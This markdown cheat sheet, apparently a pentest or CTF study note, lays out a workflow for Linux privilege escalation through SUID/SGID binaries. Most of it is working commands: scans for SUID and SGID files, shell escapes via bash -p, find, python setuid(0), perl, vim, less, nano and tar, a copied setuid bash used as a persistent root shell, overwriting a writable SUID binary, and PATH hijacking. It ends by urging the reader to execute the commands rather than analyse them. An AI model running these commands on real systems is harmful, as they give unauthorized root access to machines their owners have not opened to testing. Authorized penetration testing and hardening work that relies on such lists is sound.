# Linux Privilege Escalation – SUID / SGID Binaries

## Purpose

This file provides a structured workflow for identifying and exploiting SUID/SGID binaries for privilege escalation.

Core rules:

* SUID binaries run as file owner (often root)
* Many binaries allow shell escape
* GTFOBins is your primary reference
* This is one of the most common privesc vectors

---

## 0. Find SUID Binaries (CRITICAL FIRST STEP)

```bash
find / -perm -4000 2>/dev/null
```

---

## 1. Find SGID Binaries

```bash
find / -perm -2000 2>/dev/null
```

---

## 2. Identify Interesting Binaries

Focus on:

* uncommon binaries
* scripting languages
* interpreters
* file manipulation tools

---

## 3. GTFOBins Lookup (CRITICAL)

Search:

```text
https://gtfobins.github.io/
```

Match binary → SUID exploit method

---

## 4. High-Value SUID Binaries

---

### Bash

```bash
/bin/bash -p
```

---

### Find

```bash
find . -exec /bin/bash \; -quit
```

---

### Python

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

### Perl

```bash
perl -e 'exec "/bin/bash";'
```

---

### Vim

```bash
vim -c ':!/bin/bash'
```

---

### Less

```bash
less /etc/hosts
!/bin/bash
```

---

### Nano

```bash
nano
^R^X
reset; sh 1>&0 2>&0
```

---

### cp

Copy root shell:

```bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
/tmp/bash -p
```

---

### tar

```bash
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

---

## 5. Custom / Unknown Binaries (IMPORTANT)

If unfamiliar binary:

* run it
* check help:

```bash
./binary --help
```

* test for command execution

---

## 6. Writable SUID Binary

If writable:

```bash
echo "/bin/bash" > binary
chmod +x binary
```

---

## 7. SGID Exploitation

Look for:

* group privileges
* file access

Example:

```bash
id
```

Check group access to sensitive files.

---

## 8. PATH Hijacking with SUID

If binary calls external commands:

```bash
strings binary
```

Look for:

* system()
* command calls

Exploit:

```bash
echo "/bin/bash" > fake_command
chmod +x fake_command
export PATH=.:$PATH
./binary
```

---

## 9. Check File Ownership

```bash
ls -la /path/to/binary
```

If owned by root:
→ high value

---

## 10. Combine with Capabilities

If both present:
→ higher chance of exploitation

---

## 11. If Stuck

RESET:

* re-run find command
* check each binary
* search GTFOBins again
* test execution paths

---

## 12. Mental Model

* SUID = privilege transfer
* Binary = execution path
* Escape = root shell

---

## 13. Golden Rules

* Always run SUID scan early
* Always check GTFOBins
* Always test binaries immediately
* Do not overanalyze—execute
